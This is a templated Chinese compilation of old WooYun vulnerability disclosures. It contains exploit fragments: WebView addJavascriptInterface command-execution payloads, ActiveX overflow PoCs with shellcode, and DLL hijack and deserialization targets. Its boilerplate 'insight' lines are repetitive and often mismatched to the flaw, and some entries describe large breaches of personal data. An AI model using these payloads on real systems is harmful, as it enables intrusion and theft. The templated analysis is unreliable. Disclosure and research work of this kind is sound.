**详情**: 为了方便用户控制电视盒子，某通信厂商开发了某通信厂商随心控app，用户可以安装在手机上通过它来控制电视盒子，物理遥控器的所有功能都可以通过这个app来实现。通过对该app发送的网络数据包进行分析以及逆向某智能电视盒子里的实现远程控制的后台服务程序安装包RemoteServer.apk得到了该apk对盒子的远程控制方式，从而实现了自己的虚拟机遥控器，再辅助电视盒子提供的蓝牙功能可以实现对电视盒子的远程控制和远程安装、启动app（攻击者须和电视盒子在同一个局域网内）。并通过编程模拟发送数据包实现了对某通信厂商盒子的远程控制

**POC**: https://**.**.**.**/s/yayrap2xhr9oxxz/V41020-132051.mp4?dl=0(为嘛不支持mp4格式啊)发送控制指令给电视盒子controlCode = {"home":3,"back":4,"up":19,"left":21,"right":22,"down":20,"menu":82,"volumedown":25,"volumeup":24,"enter":23,"numKey":8,"num1":9,"num2":10,"num3":11,"power":26}def sendCtrlKeycodeToHW(tvboxIp , keycode)

**绕过**: 直接利用

**修复**: 在虚拟机遥控器接入电视盒子时加入认证机制，比如在电视显示认证码然后让遥控器app用户输入以认证或加密虚拟遥控器发出的控制指令
---

---
### [wooyun-2013-037838] 某手机浏览器远程代码执行漏洞（最新版本未修复）
**厂商**: 某安全厂商 | **年份**: 2013 | **类型**: 远程代码执行

**元思考**: 触发信号: 功能测试

**洞察**: 远程代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别远程代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 使用drops.wooyun.org的测试代码，在某品牌手机的360浏览器上打开：https://example.com/[已脱敏]

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 真不知道咋补...
---

---
### [wooyun-2012-014586] Android应用懒人听书自动更新可被利用
**厂商**: 懒人听书 | **年份**: 2012 | **类型**: 远程代码执行

**元思考**: 触发信号: 功能测试

**洞察**: 远程代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别远程代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: www.yytingting.com出品的Android有声读物软件“懒人听书”，在自动更新时没有数字签名，也没有任何认证，如果被arp欺骗，或者DNS劫持等，可被利用来替换成其他apk，最终可能达到远程代码执行的后果。

**POC**: step1. 先把android抓包环境部署好。得知此软件的自动更新检测地址为：https://example.com/[已脱敏] 访问此页面根据返回内容，大体可以确定58为最新版本号，用来和已有版本比较。下面为新版的下载地址。于是推测，通过DNS劫持等手段伪造返回页面，把APK替换成我们写的木马，即可成功。step3. 使用某互联网公司的安装包来测试可以看到，更新下载完成后，弹出的是某互联网公司的安装包。利用成功。

**绕过**: 直接利用

**修复**: 1. 软件更新最好使用签名2. 更新过程最好加密
---

---
### [wooyun-2012-07551] 118114远程代码执行
**厂商**: 118114 | **年份**: 2012 | **类型**: 系统/服务补丁不及时

**元思考**: 触发信号: 功能测试

**洞察**: 系统/服务补丁不及时防护不足，开发者信任前端输入

**测试流程**:
1. 识别系统/服务补丁不及时相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: http://[IP已脱敏]

**POC**: (见原文)

**绕过**: 直接利用

**修复**: https://example.com/[已脱敏]
---

---
### [wooyun-2015-0160386] 交通运输部上海打捞局某系统java反序列化执行漏洞管理员权限
**厂商**: 交通运输部上海打捞局 | **年份**: 2015 | **类型**: 成功的入侵事件

**元思考**: 触发信号: 功能测试

**洞察**: 成功的入侵事件防护不足，开发者信任前端输入

**测试流程**:
1. 识别成功的入侵事件相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: http://**.**.**.**:7001/defaultroot/login.jsp

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2015-0103484] hudson通用漏洞可导致源代码泄露以东方证劵为例泄露N多敏感代码
**厂商**: hudson | **年份**: 2015 | **类型**: 非授权访问

**元思考**: 触发信号: 功能测试

**洞察**: 非授权访问防护不足，开发者信任前端输入

**测试流程**:
1. 识别非授权访问相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 一种新型的漏洞Hudson利用方式，不用破解密码，不用代码执行，直接查看任意代码。1. 访问hudson首页2. 访问项目页面访问不到源代码3. 我们后面直接加入/ws/即可访问和下载所有代码http://[IP已脱敏]

**POC**: 一种新型的漏洞Hudson利用方式，不用破解密码，不用代码执行，直接查看任意代码。1. 访问hudson首页2. 访问项目页面访问不到源代码3. 我们后面直接加入/ws/即可访问和下载所有代码http://[IP已脱敏]

**绕过**: 直接利用

**修复**: 增加权限
---

---
### [wooyun-2013-039061] 易点软件全套产品线存在通用型远程代码执行
**厂商**: 某软件公司 | **年份**: 2013 | **类型**: 远程代码执行

**元思考**: 触发信号: 认证接口

**洞察**: 远程代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别远程代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: https://example.com/[已脱敏]  应用范围按官网列表http主动巡检特征：</div><div class="login_index_kj"><div class="l

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2016-0168774] 某省食品安全电子监管信息系统存在安全漏洞
**厂商**: cncert国家互联网应急中心 | **年份**: 2016 | **类型**: 系统/服务补丁不及时

**元思考**: 触发信号: 功能测试

**洞察**: 系统/服务补丁不及时防护不足，开发者信任前端输入

**测试流程**:
1. 识别系统/服务补丁不及时相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 浙江省食品安全电子监管信息系统：**.**.**.**:81/login.html?method=loginweblogic反序列化

**POC**: 可以查看和修改任意文件。

**绕过**: 直接利用

**修复**: 升级。
---

---
### [wooyun-2013-039543] 4R-IT管控系统存在通用性远程代码执行
**厂商**: 某咨询公司 | **年份**: 2013 | **类型**: 远程代码执行

**元思考**: 触发信号: 功能测试

**洞察**: 远程代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别远程代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 搜索特征：baidu：4R执行力管控平台bdidu：login!toLogin.action网络实例:https://example.com/[已脱敏] class="down"><div class="login"><div class="login-in" style="padding-top: 50px;"><table id="__02" border="0" cellpadding="0" cellspacing="0" style="margin: 

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2015-098187] 某品牌手机自带浏览器跨域脚本执行漏洞（附poc）
**厂商**: 某通信设备厂商 | **年份**: 2015 | **类型**: 远程代码执行

**元思考**: 触发信号: 功能测试

**洞察**: 远程代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别远程代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 

**POC**: <body><script>frame = document.body.appendChild(document.createElement("iframe"));frame.src = "https://example.com/[已脱敏]";frame.onload = function() {Function("}, (builtins = this), function() {");originalInstantiate = builtins.Instantiate;builtins.DefineOneShotAccessor(builtins, "Instantiate", function(

**绕过**: 直接利用

**修复**: 对builtins对象执行脚本进行限制
---

---
### [wooyun-2014-061144] 陌陌远程代码执行漏洞
**厂商**: 某社交科技公司 | **年份**: 2014 | **类型**: 远程代码执行

**元思考**: 触发信号: 功能测试

**洞察**: 远程代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别远程代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 参考:https://example.com/[已脱敏] execute(cmdArgs){return aobj.getClass().forName("java.lang.Runtime").getMethod("getRuntime",null).invoke(null,null).exec(cmdArgs);}

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 参见:https://example.com/[已脱敏]
---

---
### [wooyun-2013-039430] 瑞星安全浏览器DLL劫持漏洞
**厂商**: RiSing | **年份**: 2013 | **类型**: 远程代码执行

**元思考**: 触发信号: 功能测试

**洞察**: 远程代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别远程代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 瑞星安全浏览器2.0最新版，官方下载安装版本rse.exe，windows xp sp4环境，瑞星安全浏览器的主程序websrv.exe(版本1.0.2.73)在运行时会加载两个不带路径的cookiecomp.dll及Downloadmgr.dll文件（两文件没有随瑞星安全浏览器一起安装），导致恶意攻击者可以伪造该DLL文件用于劫持，欺骗用户打开远程文件夹下的网页或将恶意DLL文件与网页文件共同打包发送给用户诱骗用户打开网页,导致远程代码执行。

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 严格审查DLL文件加载。
---

---
### [wooyun-2014-066840] 哈雷浏览器远程代码执行漏洞
**厂商**: cncert国家互联网应急中心 | **年份**: 2014 | **类型**: 远程代码执行

**元思考**: 触发信号: 功能测试

**洞察**: 远程代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别远程代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 下载哈雷浏览器https://example.com/[已脱敏]

**POC**: 搜索JSinterface利用JSinterface构造一个写文件+弹窗的Exp：<html><head><title>test</title></head><body><script>function execute(testcmd){return JSinterface.getClass().forName("java.lang.Runtime").getMethod("getRuntime",null).invoke(null,null).exec(testcmd);}try{execute(["/system/bin/sh","-c","echo 'WooYun_TEST.' > /s

**绕过**: 直接利用

**修复**: :)
---

---
### [wooyun-2015-0158832] 通联某站存在JAVA反序列化漏洞
**厂商**: allinpay.com | **年份**: 2015 | **类型**: 网络设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 网络设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别网络设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 通联某站存在JAVA反序列化漏洞地址：[IP已脱敏]

**POC**: 通联某站存在JAVA反序列化漏洞地址：[IP已脱敏]

**绕过**: 直接利用

**修复**: 见官方修复补丁
---

---
### [wooyun-2012-07467] 某社交平台某社交平台点开好友消息 执行本地文件、命令
**厂商**: 某社交平台 | **年份**: 2012 | **类型**: 远程代码执行

**元思考**: 触发信号: 功能测试

**洞察**: 远程代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别远程代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 细节不多说，跟某互联网公司/TM的一样

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2014-071456] 猎豹浏览器存在跨域漏洞
**厂商**: 某软件厂商 | **年份**: 2014 | **类型**: 远程代码执行

**元思考**: 触发信号: 功能测试

**洞察**: 远程代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别远程代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 猎豹手机浏览器，最新版

**POC**: payload<body><script>i = document.body.appendChild(document.createElement("iframe"));i.src = "https://example.com/[已脱敏]";i.onload = function(){document.documentURI = "javascript://hostname.com/%0D%0Aalert('Hello ' + location)";i.contentWindow.location = "";}</script></body>

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2013-040476] #2 Sinfor CSProxy ActiveX Remote Code Execution
**厂商**: 某安全厂商 | **年份**: 2013 | **类型**: 远程代码执行

**元思考**: 触发信号: 功能测试

**洞察**: 远程代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别远程代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 名称:         CSProxy Class发行者:        Sinfor Technologies  Co.,Ltd类型:         ActiveX 控件版本:         4. 2. 1. 3文件日期:上次访问日期:     2013年10月21日，0:27类 ID:       {53EC2F48-968E-4A42-B99B-9F6571474213}使用计数:       40阻止次数:       0文件:         ProxyIE.dll文件夹:        C:\Program Files\Sinfor\SSL\ClientComponentException Code: ACCESS_VIOLATIONDisasm: 77BA6F29	MOV [EDI],EDX	(msvcrt.dll)Seh Chain:------------------

**POC**: <html><body><object classid="clsid:53EC2F48-968E-4A42-B99B-9F6571474213"id="target"></object><input type="button" onclick="test()" value="test" /><script>function test(){var shellcode = unescape('%uc931%ue983%ud9de%ud9ee%u2474%u5bf4%u7381%u3d13%u5e46%u8395'+'%ufceb%uf4e2%uaec1%u951a%u463d%ud0d5%ucd0

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2014-071422] DS浏览器存在远程代码执行漏洞
**厂商**: cncert国家应急响应中心 | **年份**: 2014 | **类型**: 远程代码执行

**元思考**: 触发信号: 功能测试

**洞察**: 远程代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别远程代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: DS浏览器是上海悠盟开发的产品最新版

**POC**: 存在漏洞payload<html><head><title>test</title></head><body><script>function execute(testcmd) { return JsSendToken.getClass().forName("java.lang.Runtime").getMethod("getRuntime",null).invoke(null,null).exec(testcmd); } try{ execute(["/system/bin/sh","-c","echo 'Webview远程命令执行漏洞测试.' > /sdcard/WooYun.txt"])

**绕过**: 直接利用

**修复**: null
---

---
### [wooyun-2011-02530] 某搜索引擎浏览器远程代码执行漏洞
**厂商**: 某搜索引擎 | **年份**: 2011 | **类型**: 远程代码执行

**元思考**: 触发信号: 功能测试

**洞察**: 远程代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别远程代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 某搜索引擎浏览器的库文件存在兼容问题，导致一个低级的DLL库加载错误，如果将某搜索引擎浏览器设置为windows默认浏览器，将导致一个远程代码执行漏洞。

**POC**: frameworkproxy.dll与html文件放同一目录，远程UNC路径运行。

**绕过**: 直接利用

**修复**: 参考：https://example.com/[已脱敏]
---

---
### [wooyun-2010-0366] 国泰君安证券富通页面交易安全控件远程溢出漏洞[2]
**厂商**: 国泰君安 | **年份**: 2010 | **类型**: 远程代码执行

**元思考**: 触发信号: 功能测试

**洞察**: 远程代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别远程代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 文件：ssoLib.dll版本：[IP已脱敏]clsid:FAC87377-9586-4C72-A614-8C9B3CA1BF5B属性：GetCurrentToken

**POC**: POC or exploit 请联系 phpsec@hotmail.com 索取

**绕过**: 直接利用

**修复**: 建议开发商仔细审查代码，不要多次在同一个问题上跌倒
---

---
### [wooyun-2015-092992] 某新闻APP远程代码执行漏洞
**厂商**: 某门户网站 | **年份**: 2015 | **类型**: 远程代码执行

**元思考**: 触发信号: 功能测试

**洞察**: 远程代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别远程代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 某新闻APPAndroid版导出2个js接口，可以导致远程代码执行漏洞

**POC**: 在随便一处新闻底下评论，评论是恶意链接打开即可造成远程代码执行攻击

**绕过**: 直接利用

**修复**: addJavascriptInterface存在高危远程代码执行漏洞，应尽量避免使用，API 17中用@JavascriptInterface 代替addjavascriptInterface;移除系统webkit内置的危险接口searchBoxJavaBridge_,accessibility,a
---

---
### [wooyun-2016-0195710] 某漏洞影响全国数百万证券行业相关人员信息/可查各证券公司老总信息
**厂商**: 中国证券业协会 | **年份**: 2016 | **类型**: 系统/服务补丁不及时

**元思考**: 触发信号: 功能测试

**洞察**: 系统/服务补丁不及时防护不足，开发者信任前端输入

**测试流程**:
1. 识别系统/服务补丁不及时相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 只查了少量数量证明漏洞，没有拖库，不要查我的水表中国证券业协会的这个网站有weblogic JAVA反序列化漏洞http://[IP已脱敏]中国证券业协会的网站还有几个IP应该也是使用的weblogic中间件，但只提供了HTTP服务，无法利用JAVA反序列化漏洞124.127.51.156、[IP已脱敏]、[IP已脱敏]、[IP已脱敏]、[IP已脱敏]上面提到的IP可能是修复漏了，赶快修复吧。上面提到的IP有几个系统连上服务器连上数据库800多个表1000W万学员信息，吓死我了姓名，身份证号拿身份证号去重下，29W又是学员信息，400W姓名，工作单位，职位，身份证号，手机号，工作电话，邮箱拿身份证号去重下，还是400W工作经历180W工作经历又是工作经历又有160W工作经历人员信息，姓名，工作单位，职位，身份证号，

**POC**: 见详细说明

**绕过**: 直接利用

**修复**: 打补丁可以参考：修复weblogic的JAVA反序列化漏洞的多种方法https://example.com/[已脱敏]
---

---
### [wooyun-2013-036096] 某IM软件android客户端最新版远程代码执行(可远程种植后门控制用户)
**厂商**: 某互联网公司 | **年份**: 2013 | **类型**: 远程代码执行

**元思考**: 触发信号: 功能测试

**洞察**: 远程代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别远程代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 见：https://example.com/[已脱敏] 4.5.1某互联网公司访问：https://example.com/[已脱敏] JsApi 有问题访问：https://example.com/[已脱敏]

**POC**: 见详细说明访问poc的URL执行命令创建了个xxx文件

**绕过**: 直接利用

**修复**: 你们懂滴
---

---
### [wooyun-2013-028341] K歌达人官方服务器某漏洞可导致数百万K歌达人用户数据泄露
**厂商**: okehero.com | **年份**: 2013 | **类型**: 系统/服务补丁不及时

**元思考**: 触发信号: 功能测试

**洞察**: 系统/服务补丁不及时防护不足，开发者信任前端输入

**测试流程**:
1. 识别系统/服务补丁不及时相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: Struts老漏洞了朋友或者女神手机会装个K歌达人玩K歌。于是检测下，竟然存在老漏洞用户量很大，女神很多，这个我不用说了吧。写个小门。希望官方要及时注意，还有，礼物有没，虽然是老漏洞，但是竟然没修补。

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 你们有专业的人才。
---

---
### [wooyun-2012-015872] 千千静听皮肤文件堆溢出
**厂商**: 某搜索引擎 | **年份**: 2012 | **类型**: 拒绝服务

**元思考**: 触发信号: 功能测试

**洞察**: 拒绝服务防护不足，开发者信任前端输入

**测试流程**:
1. 识别拒绝服务相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 千千静听6.1.0在读取皮肤文件时，未判断皮肤文件名长度，导致堆溢出Call Stack:0x7C920000[1240B] ntdll.dll: stricmp[+F7](3475,2069728,3475,16121856)0x7C920000[125C3] ntdll.dll: stricmp[+2AF](18849792,24576,3475,0)0x7C920000[109BA] ntdll.dll: wcsncpy[+43B](16121856,0,18846952,0)0x00400000[1AD6C3] TTPlayer.exe: (18846952,5343191,18846952,18742704)0x00400000[3E19] TTPlayer.exe: (1239860,18846964,18816740,1239420)0x00400000[117BA3] TT

**POC**: 千千静听6.1.0的皮肤文件为zip格式。解压后将其中的Skin.xml打开，修改字段值为超长字符串重新压缩。之后在千千静听中换肤，即可触发崩溃

**绕过**: 直接利用

**修复**: 对皮肤文件做校验，并对字段长度做检查
---

---
### [wooyun-2016-0191623] 某IT服务公司十台服务器沦陷/几百万运营商项目信息/全部员工个人信息/员工工资/SVN/邮件泄露
**厂商**: 某IT服务公司 | **年份**: 2016 | **类型**: 

**元思考**: 触发信号: 功能测试

**洞察**: 防护不足，开发者信任前端输入

**测试流程**:
1. 识别相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 首先声明，只查了很少的数据证明漏洞，不要查我的水表先看一下可以控制的服务器列表，全部可以利用JAVA反序列化漏洞控制。涉及好多好多应用，好多好多数据库。。。1-info这台有好多可以应用可以访问连上服务器真的好多应用好多数据库信息连上数据库好多用户，懒得统计有多少了随便看看92W运营商项目信息84W运营商项目信息72W运营商项目信息59W员工信息，应该是外包的吧组织机构都有17W记录还有好多信息，懒得一一看了某互联网公司用户邮箱这是坏账吗，还有好多和账务相关的，不贴了随便看看5W邮件还有好多，贴都贴不完这应该是正式员工的信息了，1.5W，有姓名、电话、邮箱、身份证号。。。又是某互联网公司用户到了另一个数据库了不同区域的工资每个人的工资，有的好高，不过不知道含义SVN好大的备份文件这里有一些用户密码还有好多数据库可以看的，懒得看了，这才第一台服务器，十台全这样看完我就不用睡觉了-.-后面的简单一点吧2-we

**POC**: 见详细说明

**绕过**: 直接利用

**修复**: 打补丁或者参考：修复weblogic的JAVA反序列化漏洞的多种方法https://example.com/[已脱敏]
---

---
### [wooyun-2015-0100071] 某视频网站PPS影音设计不当(可劫持DLL)
**厂商**: 奇艺 | **年份**: 2015 | **类型**: 远程代码执行

**元思考**: 触发信号: 功能测试

**洞察**: 远程代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别远程代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 某视频网站PPS 影音和子程序（某视频网站极速播放器）存在DLL劫持漏洞！当文件关联后，运行后缀名*.qsv 的播放文件时，可触发同目录下的恶意代码

**POC**: 某视频网站PPS 影音和子程序（某视频网站极速播放器）存在DLL劫持漏洞！当文件关联后，运行后缀名*.qsv 的播放文件时，可触发同目录下的恶意代码

**绕过**: 直接利用

**修复**: 编写程序时填写DLL完整路径
---

---
### [wooyun-2012-013408] 某视频播放器3.7.892 m2p文件解析堆指针覆盖漏洞
**厂商**: 某视频播放器 | **年份**: 2012 | **类型**: 远程代码执行

**元思考**: 触发信号: 功能测试

**洞察**: 远程代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别远程代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 某视频播放器最新版（3.7.892)解析M2P文件时存在一处堆指针覆盖漏洞，可以导致播放M2P文件时执行任意代码详见测试代码，已在XP上测试通过

**POC**: l = 3315716 * "A"s1 = ((0,'\x00\x00\x01\xba'), (2048, '\x00\x00\x01\xba'),(3289120, '\x00\x00\x01\xe0\x07'), (3289273, '\x00\x00\x01\xb3'),(3289283, '\xba'), (3289452, '\x42\x42\x42\x42'),(3289468, '\x00\x00\x01\x00'), (3290359, '\x00\x00\x01\x00'),(3301408, '\x00\x00\x01\xe0\x07'), (3303112, '\x00\

**绕过**: 直接利用

**修复**: 无
---

---
### [wooyun-2013-043078] #4  Sangfor CSClientManager Activex Remote Code Execution bypass dep on ie8
**厂商**: 某安全厂商 | **年份**: 2013 | **类型**: 远程代码执行

**元思考**: 触发信号: 认证接口

**洞察**: 远程代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别远程代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 该漏洞控件源自某安全厂商官方渠道登录，请对其升级，看版本应该是新版的？6.0，之前的漏洞是4.X版本的名称:         CSClientManager Class发行者:        Sangfor Technologies Co.,Ltd类型:         ActiveX 控件版本:         6. 0. 0. 0文件日期:上次访问日期:     2013年11月16日，14:51类 ID:       {D257CF85-8E97-4C9B-8407-459B28006000}使用计数:       118阻止次数:       0文件:         CSClientManagerPrj.dll文件夹:        C:\Program Files\Sangfor\SSL\ClientComponent3[+] Looking for cyclic pattern 

**POC**: <html><object classid='clsid:D257CF85-8E97-4C9B-8407-459B28006000' id='target' ></object><script >junk1 = "";while(junk1.length < 190) junk1+="A";eip = "BBBB";junk2 = "CCCCCCCCCCCCCCCCCCCC";nseh = "DDDD";seh ="EEEE";junk3 = "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2016-0169486] 某公积金管理中心java反序列化漏洞
**厂商**: cncert国家互联网应急中心 | **年份**: 2016 | **类型**: 系统/服务补丁不及时

**元思考**: 触发信号: 功能测试

**洞察**: 系统/服务补丁不及时防护不足，开发者信任前端输入

**测试流程**:
1. 识别系统/服务补丁不及时相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 漏洞地址：**.**.**.**:9060/gjjnbs/login.action存在java反序列化漏洞

**POC**: **.**.**.**:9060/gjjnbs/login.action存在java反序列化漏洞

**绕过**: 直接利用

**修复**: weblogic升级到最新版
---

---
### [wooyun-2013-042986] #3 Sinfor CSProxy Class Activex Remote Code Execution
**厂商**: 某安全厂商 | **年份**: 2013 | **类型**: 远程代码执行

**元思考**: 触发信号: 功能测试

**洞察**: 远程代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别远程代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 名称:         CSProxy Class发行者:        Sinfor Technologies  Co.,Ltd类型:         ActiveX 控件版本:         4. 2. 1. 3文件日期:上次访问日期:     2013年11月15日，13:03类 ID:       {53EC2F48-968E-4A42-B99B-9F6571474213}使用计数:       765阻止次数:       0文件:         ProxyIE.dll文件夹:        C:\Program Files\Sinfor\SSL\ClientComponent3setCacheHost提交大于276个字符之后溢出mona计算的偏移+] Looking for cyclic pattern in memoryEIP overwritten with lower

**POC**: <html><head><title>Sangfor Activex overflow PoC</title></head><!--0x033829b7 msvcrt._strlwr把字符转成小写--><body><object classid="clsid:53EC2F48-968E-4A42-B99B-9F6571474213" id='poc'></object><script>junk1 = "";while(junk1.length < 276) junk1+="A";eip = "DDDD";payload = junk1 + eip;poc.setCacheHost(payloa

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2016-0167130] 某市人力资源和社会保障局某服务器存在“Java 反序列化”漏洞
**厂商**: cncert国家互联网应急中心 | **年份**: 2016 | **类型**: 系统/服务补丁不及时

**元思考**: 触发信号: 功能测试

**洞察**: 系统/服务补丁不及时防护不足，开发者信任前端输入

**测试流程**:
1. 识别系统/服务补丁不及时相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 地址**.**.**.**:9010/存在“Java 反序列化”漏洞

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 加强安全意识
---

---
### [wooyun-2013-020260] 多家单位某安全厂商SSL VPN远程代码执行漏洞(补丁不及时)
**厂商**: 多家单位 | **年份**: 2013 | **类型**: 系统/服务补丁不及时

**元思考**: 触发信号: 功能测试

**洞察**: 系统/服务补丁不及时防护不足，开发者信任前端输入

**测试流程**:
1. 识别系统/服务补丁不及时相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 河西财政http://[IP已脱敏]

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2014-066534] 某浏览器远程任意代码执行漏洞
**厂商**: 某手机厂商 | **年份**: 2014 | **类型**: 远程代码执行

**元思考**: 触发信号: 功能测试

**洞察**: 远程代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别远程代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 某手机厂商开发的~下载某浏览器https://example.com/[已脱敏]

**POC**: 搜索addJavascriptInterface这么多- -.就拿其中的forumDetector测试下吧~构造一个写文件+弹窗的Exp：<html><head><title>test</title></head><body><script>function execute(testcmd){return forumDetector.getClass().forName("java.lang.Runtime").getMethod("getRuntime",null).invoke(null,null).exec(testcmd);}try{execute(["/system/bin/sh",

**绕过**: 直接利用

**修复**: 2S的后壳掉漆了....可以送一个2S的后壳么:)
---

---
### [wooyun-2013-042026] 2345看图王漏洞可能导致远程代码执行
**厂商**: 2345网址导航 | **年份**: 2013 | **类型**: 远程代码执行

**元思考**: 触发信号: 功能测试

**洞察**: 远程代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别远程代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 恩，就是dll hijack,d3dref9.dll,看图吧

**POC**: 放到远程共享目录或者webdav都行

**绕过**: 直接利用

**修复**: 开发懂
---

---
### [wooyun-2011-02980] 迅雷远程代码执行漏洞
**厂商**: 迅雷 | **年份**: 2011 | **类型**: 远程代码执行

**元思考**: 触发信号: 功能测试

**洞察**: 远程代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别远程代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 莫名的加载xlnet_manager.dll失败。因为loadlibrary的查找顺序中包括当前目录，所以如果迅雷没有启动的话，种子当前目中有一个名为xlnet_manager.dll的DLL的话，打开种子启动迅雷，迅雷会加载该DLL，并且导致该DLL中的dllmain中的代码被执行。很囧的是，前段时间通过在迅雷的朋友抱过一个类似的BUG。那次的BUG是一个名为“.dll”的DLL（没错，就是没有名，只有.dll）。

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 检查loadlibrary的代码喽，写绝对路径，别写相对路径。拼路径的时候检查下是否为空
---

---
### [wooyun-2015-0101877] YY浏览器下载功能未限制同源可造成RFD攻击
**厂商**: 广州多玩 | **年份**: 2015 | **类型**: 远程代码执行

**元思考**: 触发信号: 功能测试

**洞察**: 远程代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别远程代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: yy浏览器采用chrome+ie双内核，但是发现chrome内核版本比较老，存在RDF攻击的可能。访问url：https://example.com/[已脱敏]

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 参考：https://example.com/[已脱敏]
---

---
### [wooyun-2010-0885] IE8 CSS解析拒绝服务漏洞
**厂商**: 微软 | **年份**: 2010 | **类型**: 远程代码执行

**元思考**: 触发信号: 功能测试

**洞察**: 远程代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别远程代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: <div style="position: absolute; top: -999px;left: -999px;"><link href="css.css" rel="stylesheet" type="text/css" />*{color:red;}@import url("css.css");@import url("css.css");@import url("css.css");@import url("css.css");

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2013-036685] 天翼守护宝s2漏洞未修复导致任意代码执行
**厂商**: 天翼守护宝 | **年份**: 2013 | **类型**: 系统/服务补丁不及时

**元思考**: 触发信号: 上传功能

**洞察**: 系统/服务补丁不及时防护不足，开发者信任前端输入

**测试流程**:
1. 识别系统/服务补丁不及时相关功能
2. 构造测试Payload
3. 验证漏洞响应

